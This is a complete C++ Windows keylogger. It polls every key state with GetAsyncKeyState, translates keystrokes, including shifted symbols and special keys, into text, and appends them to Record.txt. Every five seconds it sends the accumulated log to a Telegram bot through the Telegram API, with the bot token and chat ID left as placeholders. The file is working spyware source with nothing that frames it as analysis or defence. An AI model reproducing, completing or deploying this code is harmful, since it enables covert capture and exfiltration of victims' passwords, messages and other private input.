#include <windows.h>
#include <wininet.h>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <cctype>

#pragma comment(lib, "wininet.lib")

std::string UrlEncode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
   for (size_t i = 0; i < value.size(); ++i) {
    unsigned char c = static_cast<unsigned char>(value[i]);

    if (std::isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
        escaped << c;
    }
    else if (c == ' ') {
        escaped << '+';
    }
    else {
        escaped << '%' << std::setw(2) << std::uppercase << int(c);
    }
}
    return escaped.str();
}

bool SendTelegramMessageGET(const std::string& botToken, const std::string& chatID, const std::string& message) {
    HINTERNET hInternet = InternetOpenA("KeyLogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return false; }

    std::string requestPath = "/bot" + botToken + "/sendMessage?chat_id=" + chatID + "&text=" + UrlEncode(message);
    const char* acceptTypes[] = { "application/json", NULL };

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", requestPath.c_str(),
                                          NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return false; }

    BOOL sent = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return sent == TRUE;
}

std::string GetKeyText(int key, bool shiftPressed) {
    if (key >= 'A' && key <= 'Z') return std::string(1, shiftPressed ? key : tolower(key));
    if (key >= '0' && key <= '9') {
        if (shiftPressed) {
            switch (key) {
                case '1': return "!"; case '2': return "@"; case '3': return "#";
                case '4': return "$"; case '5': return "%"; case '6': return "^";
                case '7': return "&"; case '8': return "*"; case '9': return "("; case '0': return ")";
            }
        }
        return std::string(1, key);
    }
    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_OEM_1: return shiftPressed ? ":" : ";";
        case VK_OEM_2: return shiftPressed ? "?" : "/";
        case VK_OEM_3: return shiftPressed ? "~" : "`";
        case VK_OEM_4: return shiftPressed ? "{" : "[";
        case VK_OEM_5: return shiftPressed ? "|" : "\\";
        case VK_OEM_6: return shiftPressed ? "}" : "]";
        case VK_OEM_7: return shiftPressed ? "\"" : "'";
        case VK_OEM_COMMA: return shiftPressed ? "<" : ",";
        case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
        case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
        case VK_OEM_PLUS: return shiftPressed ? "+" : "=";
        default: return "";
    }
}

int main() {
    const std::string botToken = "API_Token";
    const std::string chatID = "ChatID";

    bool keyPressed[256] = { false };
    DWORD lastSendTime = GetTickCount();

    while (true) {
        Sleep(10);

        // Log keys
        for (int key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!keyPressed[key]) {
                    keyPressed[key] = true;
                    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    std::string output = GetKeyText(key, shiftPressed);
                    if (!output.empty()) {
                        std::ofstream write("Record.txt", std::ios::app);
                        write << output;
                    }
                }
            } else {
                keyPressed[key] = false;
            }
        }

        // Send file every 5 seconds
        DWORD now = GetTickCount();
      if (now - lastSendTime >= 5000) {
    lastSendTime = now;

    std::ifstream file("Record.txt");
    if (file) {
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        if (!content.empty()) {
            if (SendTelegramMessageGET(botToken, chatID, content)) {
                std::cout << "[OK] Sent log file." << std::endl;
            } else {
                std::cout << "[FAIL] Could not send log file." << std::endl;
            }
        }
    }
}

    }
    return 0;
}
